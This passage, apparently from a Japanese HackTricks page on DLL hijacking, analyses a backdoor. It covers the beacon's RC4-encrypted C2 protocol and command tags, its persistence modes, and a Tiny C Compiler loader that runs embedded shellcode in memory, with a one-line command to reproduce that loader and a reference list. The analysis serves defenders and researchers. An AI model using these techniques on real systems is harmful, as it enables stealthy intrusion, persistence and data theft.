- ビーコンはドット区切りのホストプロファイルを構築し、タグ `4Q` を前置してから `HttpSendRequestA` を使ってHTTPS経由で送る前にキー `vAuig34%^325hGV` でRC4暗号化する。レスポンスはRC4復号され、タグによるスイッチで振り分けられる（`4T` シェル、`4V` プロセス実行、`4W/4X` ファイル書き込み、`4Y` 読み取り/エクスフィルト、`4\\` アンインストール、`4` ドライブ/ファイル列挙 + チャンク転送ケース）。
- 実行モードはCLI引数で制御される: 引数なし = persistenceをインストール（service/Runキー）して `-i` を指す; `-i` は自身を `-k` 付きで再起動する; `-k` はインストールをスキップしてペイロードを実行する。

観測された別のローダー
- 同じ侵入ではTiny C Compilerをドロップし、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` を実行し、`libtcc.dll` を併置していた。攻撃者が提供したCソースはシェルコードを埋め込み、コンパイルされ、PEとしてディスクに置かずにメモリ内で実行された。再現例:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC ベースの compile-and-run ステージは実行時に `Wininet.dll` をインポートし、ハードコードされた URL から second-stage shellcode を取得して、コンパイラの実行を装う柔軟な loader を提供した。

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
